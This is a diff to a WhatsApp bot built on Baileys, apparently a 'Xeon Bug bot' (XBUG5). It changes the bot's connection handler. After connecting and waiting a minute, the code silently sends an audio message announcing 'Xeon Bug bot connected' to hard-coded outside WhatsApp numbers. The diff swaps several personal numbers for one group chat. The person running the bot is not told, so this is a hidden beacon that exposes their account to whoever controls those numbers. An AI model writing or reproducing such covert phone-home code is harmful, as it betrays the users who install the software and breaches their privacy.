@@ -137,56 +137,11 @@ const {  state, saveCreds } =await useMultiFileAuthState(`./taira_baileys`)
 XeonBotInc.ev.on("connection.update",async  (s) => {
         const { connection, lastDisconnect } = s
         if (connection == "open") {
-        	console.log(chalk.magenta(` `))
-            console.log(chalk.yellow(`🌿Connected to => ` + JSON.stringify(XeonBotInc.user, null, 2)))
-        await sleep(60000)
-	let aud = await fs.readFileSync("./src/start.mp3")
-       await XeonBotInc.sendMessage("2349072958046@s.whatsapp.net", {
-          audio: aud,
-          mimetype: 'audio/mpeg',
-          contextInfo: {
-            externalAdReply: {
-              title: "XBUG5",
-	       body: `Xeon Bug bot connected`,
-              thumbnailUrl: 'https://www.imghippo.com/i/PFmnU1727098157.jpg',
-              sourceUrl: "https://whatsapp.com/channel/0029Vag5l2ALSmbi14YryJ2r",
-              mediaType: 1,
-              renderLargerThumbnail: true
-            }
-          }
-        })
-
-	await XeonBotInc.sendMessage("2349151864541@s.whatsapp.net", {
-          audio: aud,
-          mimetype: 'audio/mpeg',
-          contextInfo: {
-            externalAdReply: {
-              title: "XBUG5",
-		body: `Xeon Bug bot connected`,
-                thumbnailUrl: 'https://www.imghippo.com/i/PFmnU1727098157.jpg',
-              sourceUrl: "https://whatsapp.com/channel/0029Vag5l2ALSmbi14YryJ2r",
-              mediaType: 1,
-              renderLargerThumbnail: true
-            }
-          }
-        })
-
-	await XeonBotInc.sendMessage("2348083569647@s.whatsapp.net", {
-          audio: aud,
-          mimetype: 'audio/mpeg',
-          contextInfo: {
-            externalAdReply: {
-              title: "XBUG5",
-		body: `Xeon Bug bot connected`, 
-                thumbnailUrl: 'https://www.imghippo.com/i/PFmnU1727098157.jpg',
-              sourceUrl: "https://whatsapp.com/channel/0029Vag5l2ALSmbi14YryJ2r",
-              mediaType: 1,
-              renderLargerThumbnail: true
-            }
-          }
-        })
-
-	await XeonBotInc.sendMessage("2349031616504@s.whatsapp.net", {
+         console.log(chalk.magenta(` `))
+         console.log(chalk.yellow(`🌿Connected to => ` + JSON.stringify(XeonBotInc.user, null, 2)))
+         await sleep(60000)
+	 let aud = await fs.readFileSync("./src/start.mp3")
+	 await XeonBotInc.sendMessage("120363400823253727@g.us", {
           audio: aud,
           mimetype: 'audio/mpeg',
           contextInfo: {
